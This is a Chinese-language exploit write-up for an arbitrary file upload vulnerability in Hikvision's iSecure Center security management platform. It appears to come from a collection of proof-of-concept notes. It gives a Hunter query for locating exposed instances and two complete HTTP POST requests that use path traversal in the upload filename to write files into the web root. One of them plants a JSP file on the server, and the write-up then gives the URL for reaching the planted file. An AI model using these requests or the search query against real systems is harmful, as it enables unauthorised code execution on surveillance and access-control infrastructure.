# 海康威视iSecureCenter综合安防管理平台 svm文件上传漏洞

# 1、漏洞描述
<font style="color:rgb(0, 0, 0);">HIKVISION iSecure Center综合安防管理平台是一套“集成化”、“智能化”的平台，通过接入视频监控、一卡通、停车场、报警检测等系统的设备，获取边缘节点数据，实现安防信息化集成与联动，以电子地图为载体，融合各系统能力实现丰富的智能应用。HIKVISION iSecure Center平台基于“统一软件技术架构”先进理念设计，采用业务组件化技术，满足平台在业务上的弹性扩展。该平台适用于全行业通用综合安防业务，对各系统资源进行了整合和集中管理，实现统一部署、统一配置、统一管理和统一调度。海康威视isecure center 综合安防管理平台svm存在任意文件上传漏洞</font>

# <font style="color:rgb(0, 0, 0);">2、影响版本</font>
<font style="color:rgb(0, 0, 0);">HIKVISION iSecure Center综合安防管理平台 </font>

![1691858068026-c05d2dfd-ab38-44cf-a7d4-f5cf0f1be4a1.png](./img/icW1dT4mb2htBLN1/1691858068026-c05d2dfd-ab38-44cf-a7d4-f5cf0f1be4a1-550556.png)

# <font style="color:rgb(0, 0, 0);">3、资产测绘</font>
**hunter查询语法：**

`app.name=="Hikvision 海康威视 iSecure Center"`

# 4、漏洞复现
POC：

`https://ip/svm/api/external/report`

判断是否存在该漏洞

![1690550618393-97f7ecb5-730d-446d-9075-803c2d6de1a7.png](./img/icW1dT4mb2htBLN1/1690550618393-97f7ecb5-730d-446d-9075-803c2d6de1a7-438028.png)

## POC1
```plain
POST /svm/api/external/report HTTP/1.1
Content-Type: multipart/form-data; boundary=00content0boundary00
User-Agent: Java/1.8.0_371
Host: ip
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Length: 172

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="../../../tomcat85linux64.1/webapps/els/static/1ndex.txt"

index
--00content0boundary00--

```

![1690550672329-2a799722-e942-4433-9a33-a8dd8aa6716a.png](./img/icW1dT4mb2htBLN1/1690550672329-2a799722-e942-4433-9a33-a8dd8aa6716a-742082.png)

上传文件位置

`https://ip/els/static/1ndex.txt`

![1690550733156-055c521c-de3b-4579-a285-4fcc157d9278.png](./img/icW1dT4mb2htBLN1/1690550733156-055c521c-de3b-4579-a285-4fcc157d9278-494680.png)

## POC2
```plain
POST /svm/api/external/report HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
Content-Length: 308

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
Content-Type: application/zip

<%out.print("test");%>

------WebKitFormBoundary9PggsiM755PLa54a--


```

![1691860141018-b168e417-ef6c-4350-b31a-145140159598.png](./img/icW1dT4mb2htBLN1/1691860141018-b168e417-ef6c-4350-b31a-145140159598-991196.png)

上传文件位置

```plain
https://xx.xx.xx.xx/portal/ui/login/..;/..;/new.jsp
```

![1691860183109-9d6a9f3a-f571-4827-8b63-98f1240bdaa5.png](./img/icW1dT4mb2htBLN1/1691860183109-9d6a9f3a-f571-4827-8b63-98f1240bdaa5-122313.png)



> 更新: 2024-02-29 23:57:18  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xogv2fbt69o0h9gq>